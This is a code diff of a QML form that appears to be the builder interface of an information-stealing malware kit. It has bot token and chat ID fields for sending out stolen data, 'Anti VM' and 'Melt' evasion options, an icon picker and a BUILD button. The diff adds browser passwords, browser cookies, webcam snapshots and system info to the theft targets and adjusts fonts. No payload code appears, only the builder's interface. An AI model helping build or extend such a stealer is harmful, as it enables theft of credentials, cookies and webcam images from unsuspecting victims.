@@ -29,19 +29,22 @@ Pane {
 
             TextField {
                 id: botTokenTextField
+                font: Constants.font
                 Layout.fillWidth: true
-                placeholderText: qsTr("Bot Token")
+                placeholderText: qsTr("BOT TOKEN")
             }
 
             TextField {
                 id: chatIdTextField
+                font: Constants.font
                 Layout.preferredWidth: 120
-                placeholderText: qsTr("Chat Id")
+                placeholderText: qsTr("CHAT ID")
                 Layout.fillWidth: false
             }
 
             Button {
                 id: checkButton
+                font: Constants.largeFont
                 text: qsTr("CHECK")
                 Layout.fillWidth: false
             }
@@ -61,11 +64,12 @@ Pane {
 
                 Repeater {
                     id: checkBoxRepeater
-                    model: ["Anti VM", "Melt"]
+                    model: ["ANTI VM", "MELT"]
 
                     CheckBox {
                         Layout.fillHeight: true
                         Layout.fillWidth: true
+                        font: Constants.font
                         required property string modelData
                         text: modelData
                         checkState: Qt.Checked
@@ -74,6 +78,7 @@ Pane {
 
                 Button {
                     id: icoButton
+                    font: Constants.largeFont
                     text: qsTr("SELECT ICO")
                     Layout.alignment: Qt.AlignHCenter | Qt.AlignVCenter
                     Layout.fillWidth: true
@@ -89,14 +94,16 @@ Pane {
                     id: gridView
                     Layout.fillWidth: true
                     Layout.fillHeight: true
-                    model: ["CHROME", "FIREFOX", "SCREEN SHOT"]
+                    model: ["CHROME", "FIREFOX", "SCREEN SHOT", "BROWSER PASSWORD", "BROWSER COOKIES", "WEBCAM SNAPSHOT", "SYSTEM INFO"]
                     delegate: CheckBox {
                         required property string modelData
+                        font: Constants.font
                         text: modelData
                         checkState: Qt.Checked
                     }
 
-                    cellWidth: gridView.width / 3 > 100 ? gridView.width / 3 : 0
+                    cellWidth: gridView.width / 3 > 200 ? gridView.width / 3 : 0
+                    cellHeight: gridView.height / 3
                 }
             }
         }
@@ -108,14 +115,15 @@ Pane {
 
             Label {
                 id: buildStatusLabel
+                font: Constants.largeFont
                 text: qsTr("TODO OK || NOT OK")
                 Layout.fillHeight: false
                 Layout.fillWidth: true
-                font.pointSize: 17
             }
 
             Button {
                 id: buildButton
+                font: Constants.largeFont
                 text: qsTr("BUILD")
                 Layout.fillHeight: true
             }
